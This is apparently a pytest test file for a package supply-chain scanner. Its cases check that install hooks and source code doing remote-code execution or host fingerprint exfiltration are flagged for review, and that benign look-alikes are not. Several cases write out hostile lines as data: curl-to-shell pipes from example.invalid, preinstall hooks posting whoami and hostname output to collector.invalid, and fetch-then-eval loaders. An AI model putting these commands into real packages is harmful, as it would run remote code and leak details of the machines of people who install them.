"""Behavioral controls for inert instructions and install-time fingerprint uploads."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from supply_chain_sentinel.config import Config
from supply_chain_sentinel.models import Artifact, classify
from supply_chain_sentinel.rules import analyze
from supply_chain_sentinel.scanner import Scanner


def sample(source: str = "", hook: str = "", name: str = "ordinary-package") -> Artifact:
    return Artifact(
        name,
        "1.0.0",
        "",
        {
            "package.json": json.dumps({"name": name, "scripts": {"preinstall": hook}}).encode(),
            "index.js": source.encode(),
        },
        "synthetic",
    )


@pytest.mark.parametrize(
    "source",
    [
        "require('child_process').exec('curl https://example.invalid/setup | sh');",
        "execSync(`curl https://example.invalid/setup | bash`);",
        "spawn('sh', ['-c', 'curl https://example.invalid/setup | sh']);",
        "Bun.spawn(['sh', '-c', 'curl https://example.invalid/setup | sh']);",
    ],
)
def test_direct_shell_execution_keeps_review(source: str, config: Config) -> None:
    assert classify(analyze(sample(source), config))[1] == "review"


@pytest.mark.parametrize(
    "hook",
    [
        'curl -X POST -d "user=$(whoami)&host=$(hostname)" https://collector.invalid',
        'curl "https://collector.invalid/$(whoami)/$(hostname)/$(pwd)"',
        'curl --data="host=$(hostname)&user=$(whoami)" https://collector.invalid',
        "curl -d \"host=$(hostname)&user=$(whoami)\" 'https://collector.invalid'",
    ],
)
def test_install_hook_sends_multiple_host_identifiers(hook: str, config: Config) -> None:
    findings = analyze(sample(hook=hook), config)
    assert classify(findings)[1] == "review"
    assert any(f.rule_id == "install-host-exfil" for f in findings)


@pytest.mark.parametrize(
    "hook",
    [
        "curl https://example.invalid/version",
        "curl -d 'user=$(whoami)&host=$(hostname)' https://example.invalid",
        'curl -d "user=\\$(whoami)&host=\\$(hostname)" https://example.invalid',
        'curl https://example.invalid; echo "$(whoami) $(hostname)"',
        'echo curl -d "$(whoami) $(hostname)" https://example.invalid',
        'curl -d "host=$(hostname)" https://example.invalid',
        'curl -d "host=$(hostname) $(hostname)" https://example.invalid',
        'curl -d "',
    ],
)
def test_unrelated_or_literal_host_commands_do_not_request_review(
    hook: str, config: Config
) -> None:
    assert classify(analyze(sample(hook=hook), config))[1] == "clean"


def test_dependency_coverage_visible_for_clean_single_artifact(
    tmp_path: Path, config: Config
) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "name": "dependency-wrapper",
                "version": "1.0.0",
                "dependencies": {"uninspected-child": "^1.0.0"},
            }
        )
    )
    report = Scanner(config).scan(str(tmp_path), offline=True)
    assert report.status == "complete"
    assert report.verdict == "clean"
    assert report.coverage["dependency_resolution"] == "not-performed"
    assert report.coverage["declared_runtime_dependencies"] == 1
    assert any("does not resolve or inspect" in warning for warning in report.warnings)


@pytest.mark.parametrize(
    "source",
    [
        "fetch('https://example.invalid/script').then(r=>r.text().then(code=>eval(code)));",
        "fetch(endpoint).then(response=>response.text()).then(code=>eval(code));",
        "fetch(endpoint).then(response=>response.text()).then(eval);",
        "fetch(endpoint).then((response)=>response.text().then((code)=>eval(code)));",
    ],
)
def test_fetched_response_evaluated(source: str, config: Config) -> None:
    findings = analyze(sample(source), config)
    assert any(f.rule_id == "remote-response-execution" for f in findings)
    assert classify(findings)[1] == "review"


@pytest.mark.parametrize(
    "source",
    [
        "fetch(endpoint).then(r=>r.text()).then(text=>console.log(text));",
        "fetch(endpoint).then(r=>r.json()).then(handle); eval(other);",
        "fetch(endpoint).then(r=>other.text()).then(code=>eval(code));",
        "fetch(endpoint).then(r=>r.text()).then(code=>eval(unrelated));",
        'const documentation="fetch(endpoint).then(r=>r.text()).then(eval)";',
        "// fetch(endpoint).then(r=>r.text()).then(eval)",
    ],
)
def test_response_display_or_unrelated_eval_not_remote_execution(
    source: str, config: Config
) -> None:
    assert classify(analyze(sample(source), config))[1] == "clean"
